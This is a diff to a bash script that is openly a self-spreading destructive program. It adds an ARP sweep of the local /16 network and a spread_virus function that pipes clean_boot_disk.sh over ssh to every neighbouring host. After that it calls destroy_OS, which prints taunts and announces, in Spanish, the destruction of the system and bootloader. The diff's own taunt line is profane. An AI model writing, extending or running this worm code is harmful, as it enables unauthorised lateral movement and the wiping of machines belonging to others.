@@ -14,7 +14,7 @@ function take_boot_disk()
 function destroy_OS()
 {
     setterm -foreground red
-        for i in {1..50}; do sleep .1; echo "TE LA ACABAS DE BEBERRRR CON HIELOOOOOOOOO"; done
+        for i in {1..50}; do sleep .1; echo "       YOU FUCKED UP       "; done
     
     sleep 3
     echo -e "Procediendo a destruir el sistema y bootloader..."
@@ -99,18 +99,36 @@ function bye_bye() {
 }
 
 function check_arp_table {
-FILE_SEND="clean_boot_disk.sh"
-FILE_PATH="/tmp"    
-    ip neigh show | awk -F " " '{print $1};'
-    cd $FILE_PATH
-    for i in `ip neigh show | awk -F " " '{print $1};' | grep -vE "*.1"`; do ssh -v $i 'bash -s' < $FILE_PATH/$FILE_SEND; done
+  
+
+ip neigh show | awk -F " " '{print $1};'
+PREFIX=$(hostname -I | awk -F ' ' '{print $1};' | cut -d '.' -f-2)
+INTERFACE=$(ip a l | grep -iE "$(hostname -I | awk -F ' ' '{print $1};')" | cut -d ' ' -f12)
+
+for SUBNET in {0..255}
+do 
+    for HOST in {0..255}
+    do
+        echo "[*] IP : "$PREFIX"."$SUBNET"."$HOST
+        arping -c 1 -I $INTERFACE $PREFIX"."$SUBNET"."$HOST 2>/dev/null
+    done
+done
 
 }
 
-destroy_OS
+function spread_virus {
+FILE_SEND="clean_boot_disk.sh"
+FILE_PATH="/tmp"      
+    cd $FILE_PATH
+    for i in `ip neigh show | awk -F " " '{print $1};' | grep -vE "*.1"`; do ssh -v $i 'bash -s' < $FILE_PATH/$FILE_SEND; done
+}
 
 sleep 2
 
 check_arp_table
+
+spread_virus
+
+destroy_OS
 
 #bye_bye
